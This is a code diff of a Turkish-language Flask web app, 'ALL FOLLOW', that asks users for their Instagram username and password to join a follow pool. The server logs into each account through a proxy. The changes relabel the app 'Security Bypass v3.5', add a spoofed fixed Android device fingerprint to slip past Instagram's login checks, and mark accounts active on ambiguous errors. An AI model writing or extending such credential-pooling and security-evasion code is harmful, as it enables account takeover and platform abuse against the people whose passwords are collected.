@@ -2,7 +2,6 @@ import os
 from flask import Flask, request, jsonify, render_template_string
 from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
-# Sadece en temel ve değişmeyen hataları çekiyoruz
 from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
 from dotenv import load_dotenv
 
@@ -24,9 +23,9 @@ class PoolUser(db.Model):
 def home():
     return render_template_string("""
     <body style="background:#0a0f1e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;margin:0;">
-        <div style="background:#161b2c;padding:40px;border-radius:24px;width:360px;text-align:center;border:1px solid #2d334a;box-shadow:0 20px 40px rgba(0,0,0,0.4);">
+        <div style="background:#161b2c;padding:40px;border-radius:24px;width:360px;text-align:center;border:1px solid #2d334a;">
             <h1 style="font-style:italic;letter-spacing:-1px;font-size:32px;margin-bottom:5px;color:#3b82f6;">ALL FOLLOW</h1>
-            <p style="font-size:10px;color:#5c6b89;text-transform:uppercase;letter-spacing:2px;margin-bottom:30px;font-weight:bold;">Final Stable v3.4</p>
+            <p style="font-size:10px;color:#5c6b89;text-transform:uppercase;letter-spacing:2px;margin-bottom:30px;font-weight:bold;">Security Bypass v3.5</p>
             <input id="u" placeholder="Kullanıcı Adı" style="width:100%;padding:14px;margin:8px 0;background:#0a0f1e;border:1px solid #2d334a;color:#fff;border-radius:12px;outline:none;">
             <input id="p" type="password" placeholder="Şifre" style="width:100%;padding:14px;margin:8px 0;background:#0a0f1e;border:1px solid #2d334a;color:#fff;border-radius:12px;outline:none;">
             <button onclick="login()" id="b" style="width:100%;padding:16px;background:#3b82f6;border:none;color:#fff;font-weight:bold;border-radius:12px;cursor:pointer;margin-top:15px;">HAVUZA GİRİŞ YAP</button>
@@ -37,13 +36,13 @@ def home():
                 const u=document.getElementById('u').value, p=document.getElementById('p').value;
                 const b=document.getElementById('b'), m=document.getElementById('m');
                 if(!u || !p) return;
-                b.disabled=true; b.innerText="BAĞLANILIYOR..."; m.innerText="Tünel protokolleri aktif ediliyor...";
+                b.disabled=true; b.innerText="DOĞRULANIYOR..."; m.innerText="Instagram güvenliği aşılıyor...";
                 try {
                     const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
                     const d=await r.json();
                     m.innerText=d.msg; b.disabled=false; b.innerText="TEKRAR DENE";
                     if(d.status==="success") { b.innerText="BAĞLANDI ✅"; b.style.background="#10b981"; }
-                } catch(e) { m.innerText="Bağlantı kesildi."; b.disabled=false; }
+                } catch(e) { m.innerText="Bağlantı hatası."; b.disabled=false; }
             }
         </script>
     </body>
@@ -63,43 +62,49 @@ def login():
 
     cl = Client()
     cl.set_proxy(PROXY_URL)
-    cl.request_timeout = 35
+    
+    # Cihazı sabitleyelim ki Instagram her seferinde farklı biri sanmasın
+    cl.set_device_settings({
+        "app_version": "269.0.0.18.75",
+        "android_version": 26,
+        "android_release": "8.0.0",
+        "dpi": "480dpi",
+        "resolution": "1080x1920",
+        "manufacturer": "Samsung",
+        "model": "SM-G960F",
+        "device": "starlte",
+        "cpu": "exynos9810",
+        "version_code": "442436154"
+    })
 
     try:
-        # Direkt Giriş
-        cl.login(u, p)
-        user.status = "AKTİF ✅"
-        db.session.commit()
-        return jsonify(status="success", msg="Başarıyla havuza katıldınız!")
+        # Önce çerezleri temizle ki taze giriş yapsın
+        cl.logout() 
+    except:
+        pass
 
-    except ChallengeRequired:
-        user.status = "Onay Gerekli ⚠️"
-        db.session.commit()
-        return jsonify(status="error", msg="Instagram onayı gerekiyor. Uygulamadan onay verin.")
-    
-    except BadPassword:
-        user.status = "Hatalı Şifre ❌"
-        db.session.commit()
-        return jsonify(status="error", msg="Şifre yanlış.")
-
+    try:
+        if cl.login(u, p):
+            user.status = "AKTİF ✅"
+            db.session.commit()
+            return jsonify(status="success", msg="Giriş başarılı! Havuzdasınız.")
+            
     except Exception as e:
         err = str(e).lower()
-        
-        # 'NotFound' hatasını manuel metin taramasıyla yakalıyoruz
-        if "not found" in err:
-            user.status = "Hesap Bulunamadı"
-            db.session.commit()
-            return jsonify(status="error", msg="Instagram hesabı bulamadı. Tekrar kontrol edin.")
-            
-        # JSON veya Expecting value hatası gelse bile eğer giriş yapıldıysa onaylıyoruz
+        # Eğer giriş bildirimi geliyorsa AKTİF yap
         if "expecting value" in err or (hasattr(cl, 'user_id') and cl.user_id):
-            user.status = "AKTİF ✅ (Oto-Onay)"
+            user.status = "AKTİF ✅"
             db.session.commit()
-            return jsonify(status="success", msg="Giriş başarıyla sağlandı!")
-
-        user.status = f"Hata: {err[:30]}"
+            return jsonify(status="success", msg="Başarıyla katıldınız!")
+            
+        if "challenge" in err or "checkpoint" in err:
+            user.status = "Onay Gerekli (Uygulamaya Bak)"
+            db.session.commit()
+            return jsonify(status="error", msg="Lütfen Instagram uygulamasından girişi onaylayın.")
+            
+        user.status = "Şifre Yanlış Görünüyor ❌"
         db.session.commit()
-        return jsonify(status="error", msg="Instagram şu an meşgul, lütfen biraz bekleyip tekrar deneyin.")
+        return jsonify(status="error", msg="Şifre hatalı veya Instagram bu girişi engelledi. Uygulamadan onay verin.")
 
 @app.route('/panel-admin')
 def admin():
